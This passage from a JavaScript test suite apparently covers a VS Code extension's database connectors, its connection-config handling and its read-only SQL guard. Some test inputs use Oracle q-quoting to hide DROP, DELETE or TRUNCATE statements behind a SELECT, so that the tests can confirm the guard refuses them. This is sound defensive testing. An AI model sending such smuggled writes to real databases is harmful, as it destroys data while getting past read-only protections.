      const r = T.resolveConnectString('OTHER', plain.dir, {});
      assert.ok(/not in .*tnsnames\.ora.*found: PRODDB/.test(r.problem), r.problem);
    } finally { plain.done(); }
  });

  await test('v0.38.0: the read-only guard reads Oracle q-quotes too, so a write hidden behind one is refused', () => {
    const { checkReadOnlySql } = fresh('../dist/engine/platform/sqlGuard.js');
    for (const sql of ["SELECT q'[a']' ; DROP TABLE t --'", "SELECT nq'{x'}' ; DELETE FROM t --'", "SELECT Q'!a'!' ; TRUNCATE TABLE t --'", 'BEGIN DELETE FROM t; END;', 'SELECT * FROM emp FOR UPDATE'])
      assert.ok(!checkReadOnlySql(sql).ok, `accepted: ${sql}`);
    assert.ok(checkReadOnlySql("SELECT q'[abc]' AS s FROM dual").ok, 'a plain q-quote passes');
    assert.ok(!checkReadOnlySql("SELECT q'[it's]' AS s FROM dual").ok, 'a q-quote holding an apostrophe reads differently elsewhere and is refused (documented)');
  });

  await test('v0.38.0: Oracle adapter — connects through a tnsnames alias with the verified driver from the drivers folder; extracts tables, views, columns, comments, primary and foreign keys', async () => {
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const D = fresh('../dist/engine/platform/driverStore.js');
    const f = oracleDriversRoot();
    const t = tnsFolder(TNS);
    const h = oracleDictionary();
    try {
      const m = new ConnectionManager(() => {}, { driversRoot: () => f.root });
      await assert.rejects(() => m.connect('oracle', { connectString: 'PRODDB', username: 'hr', password: 'pw', configDir: t.dir }), /not verified|Verify Oracle Driver/, 'no load before verification');
      D.verifyDriver(f.root, 'oracle');
      await assert.rejects(() => m.connect('oracle', { connectString: 'MISSING', username: 'hr', password: 'pw', configDir: tnsFolder('A = (DESCRIPTION = (ADDRESS = (HOST = h)))').dir }), /not in .*tnsnames\.ora/);
      const info = await m.connect('oracle', { connectString: 'PRODDB', username: 'hr', password: 'pw', configDir: t.dir });
      assert.deepStrictEqual([info.platform, info.databaseName, info.schemaName, info.version], ['oracle', 'ORCLPDB1', 'HR', '19.22.0.0.0']);
      assert.deepStrictEqual(h.configs[0], { user: 'hr', password: 'pw', connectString: 'PRODDB', configDir: t.dir });
      assert.deepStrictEqual([m.getActivePlatform(), m.activeConnectionId()], ['oracle', 'oracle:PRODDB']);
      assert.deepStrictEqual(await m.listSchemas('ORCLPDB1'), ['HR', 'SALES']);
      const snap = await m.extractMetadata({ schemaFilter: ['ORCLPDB1.hr'], includeProfiling: true });
      assert.deepStrictEqual(snap.tables.map((x) => [x.fqn, x.type, x.rowCount]), [['HR.DEPARTMENTS', 'TABLE', 27], ['HR.EMPLOYEES', 'TABLE', 107], ['HR.EMP_V', 'VIEW', undefined]]);
      const emp = snap.tables[1];
      assert.deepStrictEqual(emp.columns.map((c) => [c.name, c.dataType, c.isNullable, c.isPrimaryKey, c.isForeignKey]), [
        ['EMPLOYEE_ID', 'NUMBER(6,0)', false, true, false], ['EMAIL', 'VARCHAR2(25)', false, false, false], ['DEPARTMENT_ID', 'NUMBER(4,0)', true, false, true], ['RESUME', 'CLOB', true, false, false]]);
      assert.deepStrictEqual([emp.comment, emp.columns[1].comment, emp.lastAltered], ['Staff', 'Work e-mail', '2026-01-02T03:04:05.000Z']);
      assert.deepStrictEqual(snap.views.map((v) => [v.fqn, v.definition]), [['HR.EMP_V', 'select employee_id from employees']]);
      assert.deepStrictEqual(snap.foreignKeys.map((k) => `${k.sourceTable}.${k.sourceColumn}->${k.targetTable}.${k.targetColumn}`), ['EMPLOYEES.DEPARTMENT_ID->DEPARTMENTS.DEPARTMENT_ID']);
      assert.ok(h.sql.some((s) => /WHERE t\.owner = 'HR'/.test(s)), 'the owner comes from the scope, upper-cased');
      const prof = h.sql.find((s) => /COUNT\(\*\) AS row_count/.test(s) && /EMPLOYEES/.test(s));
      assert.ok(/FROM \(SELECT \* FROM "HR"\."EMPLOYEES" FETCH FIRST 10000 ROWS ONLY\) s0/.test(prof) && /COUNT\(DISTINCT "EMAIL"\)/.test(prof) && !/RESUME/.test(prof), prof);
      assert.deepStrictEqual([emp.columns[0].profile.distinctCount, emp.columns[2].profile.nullCount], [107, 1]);
      // Probes speak Oracle: no LIMIT, no COUNT(DISTINCT a, b).
      const probes = m.probeExecutor({ sampleRows: 500 });
      await probes.run({ check: 'unique', table: { fqn: 'HR.EMPLOYEES' }, columns: ['EMPLOYEE_ID', 'EMAIL'] });
      const probeSql = h.sql.at(-1);
      assert.ok(/FETCH FIRST 500 ROWS ONLY/.test(probeSql) && /SELECT DISTINCT EMPLOYEE_ID, EMAIL/.test(probeSql) && !/LIMIT/.test(probeSql), probeSql);
      await m.disconnect();
      assert.strictEqual(h.closed, 1);
    } finally { f.done(); t.done(); delete globalThis.__autodeFakeOracle; }
  });

  await test('v0.38.0: Oracle 11g gets a plain "needs Thick mode" message; Oracle in connections.yaml and over MCP (explain via EXPLAIN PLAN, keys, consent)', async () => {
    const { OracleAdapter } = fresh('../dist/engine/platform/adapters/OracleAdapter.js');
    const h = oracleDictionary();
    h.connectError = 'NJS-138: connections to this database server version are not supported by node-oracledb in Thin mode';
    const fakeDriver = () => { const mod = { exports: {} }; new Function('exports', 'module', FAKE_ORACLEDB)(mod.exports, mod); return mod.exports; };
    await assert.rejects(() => new OracleAdapter({ connectString: 'h:1521/x', username: 'u' }, () => {}, { loadDriver: fakeDriver }).connect(), /older than Oracle 12\.1.*Thick mode/);
    delete h.connectError;
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const cfg = C.parseConnectionsConfig('connections:\n  - platform: oracle\n    connectString: PRODDB\n    username: hr\n    walletPassword: x\n  - platform: oracle\n    connectString: PRODDB\n    username: hr\n    configDir: /tns\n', { AUTODE_ORACLE_CONNECT_STRING: 'db9:1521/svc' });
    assert.deepStrictEqual(cfg.connections.map((c) => [c.id, c.origin]), [['oracle:PRODDB', 'file'], ['oracle:db9:1521/svc', 'environment']]);
    assert.ok(cfg.errors.some((e) => /walletPassword must not be in this file/.test(e)));
    // Over MCP, with the fake driver injected.
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const { Client } = require('@modelcontextprotocol/sdk/client/index.js');
    const { InMemoryTransport } = require('@modelcontextprotocol/sdk/inMemory.js');
    const { createAutodeServer } = fresh('../dist/mcp/server.js');
    const { PlatformSession } = fresh('../dist/mcp/platform.js');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-ora-mcp-'));
    nodeFs.mkdirSync(nodePath.join(ws, '.autode', 'config'), { recursive: true });
    nodeFs.writeFileSync(nodePath.join(ws, '.autode', 'config', 'connections.yaml'), 'connections:\n  - platform: oracle\n    connectString: db1:1521/prod\n    username: hr\n');
    const session = new PlatformSession({ workspaceRoot: ws, allowWrite: false, allowCli: false, log: () => {},
      createManager: (log, options) => { const m = new ConnectionManager(log, options); m.registerAdapterFactory('oracle', (c, l) => new OracleAdapter(c, l, { loadDriver: fakeDriver })); return m; } });
    const server = createAutodeServer({ workspaceRoot: ws, resourcesRoot: nodePath.join(__dirname, '..'), version: 't', platform: session, log: () => {} });
    const [a, b] = InMemoryTransport.createLinkedPair();
    await server.connect(a);
    const client = new Client({ name: 't', version: '1' });
    await client.connect(b);
    const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
    try {
      const listed = await call('autode_list_connections', {});
      assert.deepStrictEqual(listed.connections.map((c) => [c.id, c.platform, c.authMode]), [['oracle:db1:1521/prod', 'oracle', 'password']]);
      const id = 'oracle:db1:1521/prod';
      assert.deepStrictEqual(await call('autode_test_connection', { connectionId: id }), { connectionId: id, connected: true, platform: 'oracle', role: 'source', database: 'ORCLPDB1', schema: 'HR', version: '19.0.0.0.0' });
      const plan = await call('autode_explain_sql', { connectionId: id, sql: 'SELECT employee_id FROM hr.employees;' });
      assert.deepStrictEqual(plan.plan, [{ plan: 'Plan hash value: 1445457117' }]);
      assert.ok(h.sql.includes('EXPLAIN PLAN FOR SELECT employee_id FROM hr.employees'));
      const meta = await call('autode_extract_metadata', { connectionId: id, database: 'ORCLPDB1', schema: 'HR' });
      assert.strictEqual(meta.tables.find((x) => x.name === 'EMPLOYEES').columns[0].isPrimaryKey, true);
      const q = await call('autode_execute_query', { connectionId: id, sql: 'SELECT employee_id, email FROM hr.employees' });
      assert.ok(q.rows === undefined && q.rowCount === 1 && /withheld/.test(q.withheld), 'sample-data consent applies to Oracle too');
      assert.strictEqual((await call('autode_execute_query', { connectionId: id, sql: "SELECT q'[a']' ; DROP TABLE t --'" })).code, 'VALIDATION_FAILED');
    } finally { await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); delete globalThis.__autodeFakeOracle; }
  });

  await test('v0.38.0: nothing is spawned or fetched at activation or on connect; the install command reaches a terminal only from the install action\'s button', async () => {
    const cp = require('node:child_process');
    const calls = [];
    const saved = { spawn: cp.spawn, spawnSync: cp.spawnSync, exec: cp.exec, execSync: cp.execSync, execFile: cp.execFile, fetch: globalThis.fetch };
    for (const k of ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile']) cp[k] = (...args) => { calls.push(`${k} ${String(args[0])}`); return saved[k](...args); };
    globalThis.fetch = (...args) => { calls.push(`fetch ${String(args[0])}`); return saved.fetch(...args); };
    const f = oracleDriversRoot();
    const h = oracleDictionary();
    try {
      const mock = createMock();
      withMock(mock, () => { const ext = fresh('../dist/extension.js'); ext.activate(mockContext()); });
      await new Promise((r) => setTimeout(r, 200));
      fresh('../dist/engine/platform/driverStore.js').verifyDriver(f.root, 'oracle');
      const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
      const m = new ConnectionManager(() => {}, { driversRoot: () => f.root });
      await m.connect('oracle', { connectString: 'db1:1521/prod', username: 'hr', password: 'pw' });
      await m.extractMetadata({});
      assert.deepStrictEqual(calls, [], `unexpected: ${calls.join('; ')}`);
    } finally {
      for (const k of ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile']) cp[k] = saved[k];
      globalThis.fetch = saved.fetch;
      f.done(); delete globalThis.__autodeFakeOracle;
    }
    // The install action: cancelled → no terminal; "Run in AutoDE terminal" → the exact command, once.
    const { installDriverCommand } = fresh('../dist/core/platformPrerequisites.js');
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const root = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-drv-install-'));
    const sent = [];
    const fakeVs = (answer) => ({
      window: {
        terminals: [],
        createTerminal: (opts) => ({ name: opts.name, show() {}, sendText: (text) => sent.push({ text, cwd: opts.cwd }) }),
        showInformationMessage: async (msg) => (/^Install the/.test(msg) ? answer : undefined),
        showWarningMessage: async () => undefined, showErrorMessage: async () => undefined
      },
      env: { clipboard: { writeText: async (t) => sent.push({ copied: t }) }, openExternal: async () => true },
      Uri: { parse: (s) => s }, commands: { executeCommand: async () => {} }
    });
    const host = { driversDirectory: () => root, snowflakeCliPath: () => '', databricksCliPath: () => '', log: () => {} };
    try {
      await installDriverCommand(fakeVs(undefined), host, 'oracle');
      assert.deepStrictEqual(sent, [], 'dismissing the dialog runs nothing');
      await installDriverCommand(fakeVs('Run in AutoDE terminal'), host, 'oracle');
      const npmFound = sent.length > 0;
      if (npmFound) {
        assert.deepStrictEqual(sent, [{ text: `npm install --prefix "${nodePath.join(root, 'oracle')}" --ignore-scripts --no-audit --no-fund "oracledb@^6.0.0"`, cwd: nodePath.join(root, 'oracle') }]);
        assert.ok(!nodeFs.existsSync(nodePath.join(root, 'oracle', 'node_modules')), 'AutoDE itself installed nothing');
      }
    } finally { nodeFs.rmSync(root, { recursive: true, force: true }); }
  });

  await test('v0.38.0: no driver ships — neither the package manifest nor the bundles contain oracledb', () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const pkg = require('../package.json');
    for (const section of ['dependencies', 'devDependencies', 'optionalDependencies']) assert.ok(!pkg[section] || !pkg[section].oracledb, `oracledb in ${section}`);
    const notices = nodePath.join(__dirname, '..', 'dist', 'THIRD-PARTY-NOTICES.md');
    if (nodeFs.existsSync(notices)) assert.ok(!/oracledb/.test(nodeFs.readFileSync(notices, 'utf8')), 'oracledb was bundled');
    for (const b of ['extension.js', 'autode.js']) {
      const text = nodeFs.readFileSync(nodePath.join(__dirname, '..', 'dist', b), 'utf8');
      assert.ok(!/node_modules[\\/]+oracledb/.test(text), `${b} contains oracledb sources`);
    }
  });

  // ── v0.39.0: DRV2 — platform onboarding in the cards, named connections, readiness ──

  function drv2Workspace(prefix) {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), prefix));
    return { ws, file: (...p) => nodePath.join(ws, ...p), read: (...p) => nodeFs.readFileSync(nodePath.join(ws, ...p), 'utf8'), exists: (...p) => nodeFs.existsSync(nodePath.join(ws, ...p)), done: () => nodeFs.rmSync(ws, { recursive: true, force: true }) };
  }

  await test('v0.39.0: the personal file adds per-engineer fields to a team entry by id; consent and secrets stay out of it; it may hold connections of its own', () => {
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const team = [
      'connections:',
      '  - id: snowflake:ACME',
      '    platform: snowflake',
      '    account: ACME',
      '    warehouse: WH',
      '    credentials: { resolver: cli, ref: prod }',
      '    allowSampleDataInPrompts: false'
    ].join('\n');
    const local = [
      'connections:',
      '  - id: snowflake:ACME',
      '    username: arun',
      '    keyPath: /home/arun/key.p8',
      '    authMode: key-pair',
      '    credentials: { resolver: vscode, ref: ACME }',
      '    allowSampleDataInPrompts: true',
      '  - id: snowflake:ACME',
      '    password: hunter2',
      '  - platform: oracle',
      '    connectString: LEGACYDB',
      '    username: scott',
      '    credentials: { resolver: vscode, ref: LEGACYDB }'
    ].join('\n');
    const cfg = C.parseConnectionsConfig(team, {}, local);
    const sf = cfg.connections.find((c) => c.id === 'snowflake:ACME');
    assert.deepStrictEqual(sf.fields, { account: 'ACME', warehouse: 'WH', username: 'arun', keyPath: '/home/arun/key.p8', authMode: 'key-pair' });
    assert.deepStrictEqual(sf.credentials, { resolver: 'vscode', ref: 'ACME' }, 'an engineer may point the team entry at their own credentials');
    assert.strictEqual(sf.allowSampleDataInPrompts, false, 'consent is the team\'s decision');
    assert.deepStrictEqual(sf.personal, ['username', 'keyPath', 'authMode', 'credentials']);
    assert.ok(cfg.errors.some((e) => /local connections\[0\].*allowSampleDataInPrompts is the team's decision/.test(e)));
    assert.ok(cfg.errors.some((e) => /local connections\[1\].*password must not be in this file either/.test(e)));
    assert.ok(!JSON.stringify(cfg.connections).includes('hunter2'));
    const ora = cfg.connections.find((c) => c.platform === 'oracle');
    assert.deepStrictEqual([ora.id, ora.origin, ora.credentials.resolver], ['oracle:LEGACYDB', 'local', 'vscode']);
    assert.ok(C.parseConnectionsConfig('connections:\n  - platform: oracle\n    role: target\n    connectString: X\n', {}).errors.some((e) => /Oracle is supported as a source only/.test(e)));
    // Snowflake's own role is snowflakeRole in the file (role is source/target); the adapter still gets role.
    const roled = C.parseConnectionsConfig('connections:\n  - platform: snowflake\n    role: target\n    account: T\n    snowflakeRole: LOADER\n', {});
    assert.deepStrictEqual([roled.errors, roled.connections[0].role, C.adapterFields(roled.connections[0].fields)], [[], 'target', { account: 'T', role: 'LOADER' }]);
    assert.ok(C.parseConnectionsConfig('', {}, 'connections:\n  - id: snowflake:nope\n    username: x\n').errors.some((e) => /no team connection "snowflake:nope"/.test(e)));
  });

  await test('v0.39.0: a resolver: vscode entry outside VS Code takes its secret from the same-named env variables, or fails saying exactly which ones', async () => {
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const entry = C.parseConnectionsConfig('connections:\n  - platform: databricks\n    workspaceUrl: adb-1.azuredatabricks.net\n    httpPath: /sql/1.0/warehouses/abc\n    credentials: { resolver: vscode, ref: finance }\n', {}).connections[0];
    assert.deepStrictEqual(C.envStandInVariables(entry), ['AUTODE_DATABRICKS_FINANCE_TOKEN']);
    await assert.rejects(() => C.resolveConnectionCredentials(entry, {}), /keeps its secret in VS Code's secret storage.*AUTODE_DATABRICKS_FINANCE_TOKEN/);
    const creds = await C.resolveConnectionCredentials(entry, { AUTODE_DATABRICKS_FINANCE_TOKEN: 'dapi-x' });
    assert.deepStrictEqual(creds, { workspaceUrl: 'adb-1.azuredatabricks.net', httpPath: '/sql/1.0/warehouses/abc', token: 'dapi-x' });
    // Key-pair without a passphrase needs no secret at all.
    const kp = C.parseConnectionsConfig('connections:\n  - platform: snowflake\n    account: A\n    authMode: key-pair\n    keyPath: /k.p8\n    credentials: { resolver: vscode, ref: A }\n', {}).connections[0];
    assert.deepStrictEqual(await C.resolveConnectionCredentials(kp, {}), { account: 'A', authMode: 'key-pair', keyPath: '/k.p8' });
    // Inside VS Code the registered SecretStorage resolver answers instead.
    const R = require('../dist/engine/platform/credentials/registry.js');
    R.registerCredentialResolver({ id: 'vscode-secret-storage', supportedPrincipalTypes: ['interactive-user'], resolve: async (ref) => (ref.ref === 'finance' ? { token: 'from-secret-storage' } : undefined) });
    try {
      const C2 = fresh('../dist/engine/platform/connectionsConfig.js');
      assert.strictEqual((await C2.resolveConnectionCredentials(entry, {})).token, 'from-secret-storage');
    } finally { R.unregisterCredentialResolver('vscode-secret-storage'); }
  });

  await test('v0.39.0: saving a connection splits it — shared fields to the committed file (its comments kept), personal fields to .autode/local — and refuses secrets', () => {
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const w = drv2Workspace('autode-drv2-save-');
    const nodeFs = require('node:fs');
    try {
      nodeFs.mkdirSync(w.file('.autode', 'config'), { recursive: true });
      nodeFs.writeFileSync(w.file('.autode', 'config', 'connections.yaml'), '# Team connections — reviewed by the platform team\nconnections:\n  - platform: snowflake\n    credentials: { resolver: cli, ref: prod }   # the shared prod account\n');
      const saved = C.saveConnection(w.ws, { platform: 'snowflake', role: 'source', fields: { account: 'ACME', username: 'arun', keyPath: '/k.p8', warehouse: 'WH', authMode: 'key-pair' }, credentials: { resolver: 'vscode', ref: 'ACME' } });
      assert.deepStrictEqual(saved, { id: 'snowflake:ACME', written: ['.autode/config/connections.yaml', '.autode/local/connections.yaml'], credentialsLocal: undefined });
      const teamText = w.read('.autode', 'config', 'connections.yaml');
      assert.ok(teamText.includes('# Team connections — reviewed by the platform team') && teamText.includes('# the shared prod account'), 'comments survive');
      assert.ok(!/arun|k\.p8/.test(teamText), 'personal fields are not committed');
      assert.ok(/username: arun/.test(w.read('.autode', 'local', 'connections.yaml')));
      assert.ok(/local\//.test(w.read('.autode', '.gitignore')), 'the personal file is gitignored');
      const cfg = C.loadConnectionsConfig(w.ws, {});
      assert.deepStrictEqual(cfg.errors, []);
      assert.deepStrictEqual(cfg.connections.map((c) => c.id), ['snowflake:prod', 'snowflake:ACME']);
      assert.deepStrictEqual(cfg.connections[1].fields, { account: 'ACME', warehouse: 'WH', authMode: 'key-pair', username: 'arun', keyPath: '/k.p8' });
      // A second engineer choosing other credentials for the same team entry: theirs go to the local file.
      const again = C.saveConnection(w.ws, { platform: 'snowflake', role: 'source', fields: { account: 'ACME', warehouse: 'WH', authMode: 'key-pair' }, credentials: { resolver: 'env', ref: 'ACME' } });
      assert.strictEqual(again.credentialsLocal, true);
      assert.ok(/resolver: vscode/.test(w.read('.autode', 'config', 'connections.yaml')), 'the team entry keeps its credentials');
      assert.throws(() => C.saveConnection(w.ws, { platform: 'snowflake', role: 'source', fields: { account: 'X', password: 'p' }, credentials: { resolver: 'vscode', ref: 'X' } }), /password can't be written/);
      assert.throws(() => C.saveConnection(w.ws, { platform: 'oracle', role: 'target', fields: { connectString: 'X' }, credentials: { resolver: 'vscode', ref: 'X' } }), /source only/);
      // A personal connection stays in the local file only.
      const mine = C.saveConnection(w.ws, { platform: 'oracle', role: 'source', fields: { connectString: 'LEGACY', username: 'scott' }, credentials: { resolver: 'vscode', ref: 'LEGACY' }, scope: 'personal' });
      assert.deepStrictEqual(mine.written, ['.autode/local/connections.yaml']);
      assert.ok(!/LEGACY/.test(w.read('.autode', 'config', 'connections.yaml')));
      assert.deepStrictEqual(C.removeConnection(w.ws, 'snowflake:ACME', {}), ['.autode/config/connections.yaml', '.autode/local/connections.yaml']);
      assert.deepStrictEqual(C.loadConnectionsConfig(w.ws, {}).connections.map((c) => [c.id, c.origin]), [['snowflake:prod', 'file'], ['oracle:LEGACY', 'local']]);
    } finally { w.done(); }
  });

  await test('v0.39.0: readiness is per machine and bound to the entry — an edit makes it stale; AutoDE and MCP clients are reported separately', () => {
    const C = fresh('../dist/engine/platform/connectionsConfig.js');
    const Rd = fresh('../dist/engine/platform/connectionReadiness.js');
    const w = drv2Workspace('autode-drv2-ready-');
    try {
      const [dbx, sf] = C.parseConnectionsConfig('connections:\n  - platform: databricks\n    workspaceUrl: adb-1\n    httpPath: /p\n    credentials: { resolver: vscode, ref: fin }\n  - platform: snowflake\n    credentials: { resolver: cli, ref: prod }\n', {}).connections;
      assert.strictEqual(Rd.connectionStatus(dbx, undefined).autode, 'unchecked');
      Rd.recordReadiness(w.ws, dbx, true, 'main.default (x)');
      Rd.recordReadiness(w.ws, sf, true, 'DB.PUBLIC (9)');
      assert.ok(w.exists('.autode', 'local', 'connection-readiness.json'));
      const rec = Rd.readReadiness(w.ws);
      const d = Rd.connectionStatus(dbx, rec[dbx.id]);
      assert.deepStrictEqual([d.autode, d.mcp.ready], ['ready', false]);
      assert.ok(/AUTODE_DATABRICKS_FIN_TOKEN/.test(d.mcp.note));
      const s2 = Rd.connectionStatus(sf, rec[sf.id]);
      assert.deepStrictEqual([s2.autode, s2.mcp.ready], ['ready', true]);
      assert.ok(/--allow-cli/.test(s2.mcp.note));
      const edited = { ...dbx, fields: { ...dbx.fields, httpPath: '/other' } };
      assert.strictEqual(Rd.connectionStatus(edited, rec[dbx.id]).autode, 'stale');
      assert.strictEqual(Rd.entryHash({ ...dbx, fields: { httpPath: '/p', workspaceUrl: 'adb-1' } }), Rd.entryHash(dbx), 'field order does not matter');
      Rd.forgetReadiness(w.ws, dbx.id);
      assert.ok(!(dbx.id in Rd.readReadiness(w.ws)));
    } finally { w.done(); }
  });

  function drv2Onboarding(ws, settings, connect) {
    const { PlatformOnboarding } = fresh('../dist/core/platformOnboarding.js');
    const { ConnectionManager } = fresh('../dist/engine/platform/ConnectionManager.js');
    const store = new Map([['card.source.snowflake.password', 'pw-1'], ['card.source.databricks.token', 'dapi-1']]);
    const connected = [];
    const onboarding = new PlatformOnboarding({
      workspaceRoot: () => ws,
      settings: () => ({ defaultSnowflakeSchema: 'PUBLIC', defaultSnowflakeRole: 'SYSADMIN', ...settings }),
      secrets: { get: async (k) => store.get(k), store: async (k, v) => { store.set(k, v); }, delete: async (k) => { store.delete(k); } },
      secretKey: (platform, ref, field) => `named.${platform}.${ref}.${field}`,
      cardSecretKey: (role, platform, field) => `card.${role}.${platform}.${field}`,
      createManager: (log) => {
        const m = new ConnectionManager(log);
        for (const p of ['snowflake', 'databricks', 'oracle']) m.registerAdapterFactory(p, (creds) => ({ connect: async () => { connected.push({ p, creds }); return connect(p, creds); }, disconnect: async () => {}, dispose() {} }));
        return m;
      },
      log: () => {}
    });
    return { onboarding, store, connected };
  }

  await test('v0.39.0: Save as named connection checks first — a failed check writes nothing; a passing one saves, moves the secret to the connection\'s reference and marks it ready', async () => {
    const w = drv2Workspace('autode-drv2-onb-');
    try {
      let fail = true;
      const settings = { defaultSnowflakeAccount: 'ACME', defaultSnowflakeUsername: 'arun', defaultSnowflakeAuthMode: 'username-password', defaultSnowflakeWarehouse: 'WH' };
      const { onboarding, store, connected } = drv2Onboarding(w.ws, settings, () => { if (fail) throw new Error('390100 incorrect username or password'); return { databaseName: 'DB', schemaName: 'PUBLIC', version: '9.1' }; });
      const bad = await onboarding.saveFromCard('snowflake', 'source', {});
      assert.deepStrictEqual([bad.ok, /Not saved.*incorrect username/.test(bad.message)], [false, true]);
      assert.ok(!w.exists('.autode', 'config', 'connections.yaml'), 'nothing written on a failed check');
      assert.strictEqual(connected[0].creds.password, 'pw-1', 'the check used the card\'s stored password');
      fail = false;
      const ok = await onboarding.saveFromCard('snowflake', 'source', {});
      assert.ok(ok.ok, ok.message);
      assert.strictEqual(ok.id, 'snowflake:ACME');
      assert.strictEqual(store.get('named.snowflake.ACME.password'), 'pw-1');
      assert.ok(!/pw-1/.test(w.read('.autode', 'config', 'connections.yaml') + w.read('.autode', 'local', 'connections.yaml')), 'no secret on disk');
      const st = onboarding.state();
      assert.deepStrictEqual(st.connections.map((c) => [c.id, c.resolver, c.status.autode, c.status.mcp.ready]), [['snowflake:ACME', 'vscode', 'ready', false]]);
      assert.ok(/AUTODE_SNOWFLAKE_ACME_PASSWORD/.test(st.connections[0].status.mcp.note));
      assert.ok(/Snowflake CLI/.test(st.backends['snowflake:username-password'].backend) && /SQL API/.test(st.backends.snowflake.backend));
      // The Connect path: credentials through the resolvers (VS Code's secret storage registered in the host).
      const R = require('../dist/engine/platform/credentials/registry.js');
      R.registerCredentialResolver({ id: 'vscode-secret-storage', supportedPrincipalTypes: ['interactive-user'], resolve: async (ref) => { const v = store.get(`named.${ref.platform}.${ref.ref}.password`); return v ? { password: v } : undefined; } });
      try {
        const named = await onboarding.credentialsFor('snowflake:acme');
        assert.deepStrictEqual(named.credentials, { account: 'ACME', username: 'arun', warehouse: 'WH', schema: 'PUBLIC', role: 'SYSADMIN', authMode: 'username-password', password: 'pw-1' });
        fail = true;
        const re = await onboarding.recheck('snowflake:ACME');
        assert.strictEqual(re.ok, false);
        assert.strictEqual(onboarding.state().connections[0].status.autode, 'failed');
      } finally { R.unregisterCredentialResolver('vscode-secret-storage'); }
      await assert.rejects(() => onboarding.credentialsFor('snowflake:gone'), /No connection "snowflake:gone"/);
      const removed = await onboarding.remove('snowflake:ACME');
      assert.ok(removed.ok && !store.has('named.snowflake.ACME.password'), 'removing deletes its secret');
      assert.deepStrictEqual((await onboarding.saveFromCard('oracle', 'target', {})).ok, false);
    } finally { w.done(); }
  });

  await test('v0.39.0: a .databrickscfg profile onboards as a CLI connection (host and token from the profile, HTTP path from the card); a profile without a token is explained', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const w = drv2Workspace('autode-drv2-dbx-');
    const cfgFile = nodePath.join(w.ws, '.databrickscfg');
    nodeFs.writeFileSync(cfgFile, '[DEFAULT]\nhost = https://adb-7.azuredatabricks.net\ntoken = dapi-profile\n\n[sso]\nhost = https://adb-8.azuredatabricks.net\nauth_type = databricks-cli\n');
    const savedCfg = process.env.DATABRICKS_CONFIG_FILE;
    process.env.DATABRICKS_CONFIG_FILE = cfgFile;
    const origFetch = global.fetch;
    const hosts = [];
    global.fetch = async (url, init) => { hosts.push([String(url).split('/api/')[0], init.headers.Authorization]); return { status: 200, json: async () => ({ status: { state: 'SUCCEEDED' }, manifest: { schema: { columns: [{ name: 'CURRENT_CATALOG' }, { name: 'CURRENT_SCHEMA' }] } }, result: { data_array: [['main', 'default']] } }) }; };
    try {
      const { DatabricksAdapter } = fresh('../dist/engine/platform/adapters/DatabricksAdapter.js');
      const info = await new DatabricksAdapter({ profile: 'DEFAULT', httpPath: '/sql/1.0/warehouses/abc' }, () => {}).connect();
      assert.strictEqual(info.databaseName, 'main');
      assert.deepStrictEqual(hosts[0], ['https://adb-7.azuredatabricks.net', 'Bearer dapi-profile']);
      await assert.rejects(() => new DatabricksAdapter({ profile: 'DEFAULT' }, () => {}).connect(), /also needs the SQL warehouse HTTP path/);
      await assert.rejects(() => new DatabricksAdapter({ profile: 'sso', httpPath: '/p' }, () => {}).connect(), /auth_type databricks-cli\) has no personal access token/);
      const { onboarding } = drv2Onboarding(w.ws, { defaultDatabricksHttpPath: '/sql/1.0/warehouses/abc', defaultDatabricksCatalog: 'main' }, (p, creds) => new DatabricksAdapter(creds, () => {}).connect());
      const existing = await onboarding.existing('databricks');
      assert.deepStrictEqual(existing.items.map((i) => [i.name, i.usable]), [['DEFAULT', true], ['sso', false]]);
      const saved = await onboarding.saveFromCard('databricks', 'source', { cliRef: 'DEFAULT' });
      assert.ok(saved.ok, saved.message);
      assert.strictEqual(saved.id, 'databricks:DEFAULT');
      const team = w.read('.autode', 'config', 'connections.yaml');
      assert.ok(/resolver: cli/.test(team) && /httpPath: \/sql\/1.0\/warehouses\/abc/.test(team) && !/dapi/.test(team));
      assert.deepStrictEqual(onboarding.state().connections.map((c) => [c.status.autode, c.status.mcp.ready]), [['ready', true]]);
    } finally {
      global.fetch = origFetch;
      if (savedCfg === undefined) delete process.env.DATABRICKS_CONFIG_FILE; else process.env.DATABRICKS_CONFIG_FILE = savedCfg;
      w.done();
    }
  });

  await test('v0.39.0: tnsnames aliases are offered for the Oracle card; the MCP listing names the env variables that stand in for a vscode secret', async () => {
    const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const w = drv2Workspace('autode-drv2-ora-');
    try {
      nodeFs.writeFileSync(nodePath.join(w.ws, 'tnsnames.ora'), 'PRODDB = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = db1)(PORT = 1521)) (CONNECT_DATA = (SERVICE_NAME = prod)))\nREPORTING = (DESCRIPTION = (ADDRESS = (PROTOCOL = TCP)(HOST = db2)(PORT = 1521)) (CONNECT_DATA = (SERVICE_NAME = rpt)))\n');
      const { onboarding } = drv2Onboarding(w.ws, { oracleConfigDir: w.ws }, () => ({ databaseName: 'ORCL', schemaName: 'HR', version: '19' }));
      const existing = await onboarding.existing('oracle');
      assert.deepStrictEqual([existing.kind, existing.items.map((i) => i.name)], ['tns', ['PRODDB', 'REPORTING']]);
      nodeFs.mkdirSync(w.file('.autode', 'config'), { recursive: true });
